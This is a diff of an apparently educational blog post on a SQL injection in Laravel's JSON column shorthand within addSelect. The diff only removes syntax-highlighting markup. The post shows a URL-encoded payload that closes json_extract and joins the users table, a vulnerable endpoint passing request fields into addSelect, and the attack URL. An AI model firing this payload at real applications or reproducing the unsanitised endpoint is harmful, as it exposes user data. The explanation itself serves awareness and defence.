@@ -30,12 +30,12 @@ Laravel has the ability to manually specify which columns to select on a query.
 It also offers the shorthand notation to query JSON data:
 
 ```
-<hljs type>Blog</hljs>::<hljs prop>query</hljs>()
-    -><hljs prop>addSelect</hljs>('<hljs green>title</hljs>-><hljs blue>en</hljs>');
+Blog::query()
+    ->addSelect('title->en');
 ```
 
 ```
-<hljs keyword>SELECT</hljs> <hljs prop>json_extract</hljs>(`<hljs green>title</hljs>`, '$."<hljs blue>en</hljs>"') <hljs keyword>FROM</hljs> blogs;
+SELECT json_extract(`title`, '$."en"') FROM blogs;
 ```
 
 Instead of manually writing `json_extract`, we can use the simplified `->` syntax, 
@@ -45,26 +45,26 @@ Be careful though: Laravel won't do any escaping during this conversion.
 Consider the following example:
 
 ```
-<hljs type>Blog</hljs>::<hljs prop>query</hljs>()
-    -><hljs prop>addSelect</hljs>('<hljs green>title</hljs>-><hljs blue>en</hljs><hljs red>'#</hljs>');
+Blog::query()
+    ->addSelect('title->en'#');
 ```
 
 By inserting `'#` in our input, we can manually close the `json_extract` function, 
 and ignore the rest of the query:
 
 ```
-<hljs keyword>SELECT</hljs> <hljs prop>json_extract</hljs>(`<hljs green>title</hljs>`, '$."<hljs blue>en</hljs><hljs red>'#</hljs><hljs textgrey>"') FROM blogs;</hljs>
+SELECT json_extract(`title`, '$."en'#"') FROM blogs;
 ```
 
 This query will fail because of syntax errors, but what about the next one?
 
 ```
-<hljs keyword>SELECT</hljs> <hljs prop>json_extract</hljs>(
-    `<hljs green>title</hljs>`, 
-    '$."<hljs blue>en</hljs><hljs red>"')) 
+SELECT json_extract(
+    `title`, 
+    '$."en"')) 
 FROM blogs RIGHT OUTER JOIN users ON users.id <> null
-#</hljs>
-    <hljs textgrey>"') FROM blogs;</hljs>
+#
+    "') FROM blogs;
 ```
 
 We're adding an outer join on the `users` table. 
@@ -73,18 +73,18 @@ Essentially selecting all data in it.
 For reference, this is the URL encoded version of the malicious code:
 
 ```
-<hljs red>%22%27%29%29+FROM+blogs+RIGHT+OUTER+JOIN+users+ON+users.id+%3C%3E+null%23</hljs>
+%22%27%29%29+FROM+blogs+RIGHT+OUTER+JOIN+users+ON+users.id+%3C%3E+null%23
 ```
 
 Say we have the following endpoint in our application, to query blog posts from a public API:
 
 ```php
-<hljs type>Route</hljs>::<hljs prop>get</hljs>('/posts', function (<hljs type>Request</hljs> $request) {
-    $fields = $request-><hljs prop>get</hljs>('fields', []);
+Route::get('/posts', function (Request $request) {
+    $fields = $request->get('fields', []);
 
-    $users = <hljs type>Blog</hljs>::<hljs prop>query</hljs>()-><hljs prop>addSelect</hljs>($fields)-><hljs prop>get</hljs>();
+    $users = Blog::query()->addSelect($fields)->get();
 
-    return <hljs prop>response</hljs>()-><hljs prop>json</hljs>($users);
+    return response()->json($users);
 });
 ```
 
@@ -101,16 +101,16 @@ The endpoint can now be used like this:
 Now we insert our malicious code instead:
 
 ```
-/blog?fields[]=<hljs red>%22%27%29%29+FROM+blogs+RIGHT+OUTER+JOIN+users+ON+users.id+%3C%3E+null%23</hljs>
+/blog?fields[]=%22%27%29%29+FROM+blogs+RIGHT+OUTER+JOIN+users+ON+users.id+%3C%3E+null%23
 ```
 
 It will be added to the query. And by returning the query result as JSON, 
 we'll see the full contents of the users table. 
 
 ```php
-<hljs type>Blog</hljs>::<hljs prop>query</hljs>()-><hljs prop>addSelect</hljs>([
-    '<hljs red>%22%27%29%29+FROM+blogs+RIGHT+OUTER+JOIN+users+ON+users.id+%3C%3E+null%23</hljs>'
-])-><hljs prop>get</hljs>();
+Blog::query()->addSelect([
+    '%22%27%29%29+FROM+blogs+RIGHT+OUTER+JOIN+users+ON+users.id+%3C%3E+null%23'
+])->get();
 ```
 
 Two things need to be in place for this attack to be possible:
